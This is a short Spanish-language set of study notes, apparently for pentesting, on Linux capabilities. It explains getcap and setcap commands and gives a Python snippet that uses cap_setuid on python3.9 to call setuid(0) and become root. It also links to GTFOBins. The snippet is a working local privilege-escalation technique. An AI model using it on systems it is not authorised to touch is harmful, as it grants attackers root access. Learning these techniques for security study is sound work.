
- `getcap -r / 2> /dev/null`: Muestra las capacidades de seguridad establecidas en archivos binarios y bibliotecas en todo el sistema. El redireccionamiento `2> /dev/null` descarta los mensajes de error.
    
- `setcap cap_setuid+ep /usr/bin/python3.9`: Establece la capacidad `cap_setuid` en el archivo binario `/usr/bin/python3.9`, lo que permite que se ejecute con los privilegios del propietario incluso si el bit "setuid" no está activado.
    
- `getcap /usr/bin/python3.9`: Muestra las capacidades de seguridad establecidas en el archivo binario `/usr/bin/python3.9`.
    
- `setcap -r /usr/bin/python3.9`: Elimina todas las capacidades de seguridad establecidas en el archivo binario `/usr/bin/python3.9`.
    
- `getcap $!`: Muestra las capacidades de seguridad establecidas en el último proceso ejecutado en segundo plano (`$!`).
    
- `cat /etc/shells`: Muestra una lista de todas las shells disponibles en el sistema según el archivo `/etc/shells`.

##### Ejemplo si python3.9 contara con capabilities

```python
import os 
os.system("whoami") # ressc 0
os.setuid(0)
os.system("whoami") # root 0
```

##### ANEXO 

¿Qué son las Linux Capabilities?: [http://www.etl.it.uc3m.es/Linux_Capabilities](http://www.etl.it.uc3m.es/Linux_Capabilities)

GTFOBins: Un enlace a una lista de comandos y técnicas que aprovechan las Linux Capabilities y otros mecanismos para obtener privilegios elevados en sistemas:[https://gtfobins.github.io/#+capabilities][https://gtfobins.github.io/#+capabilities] 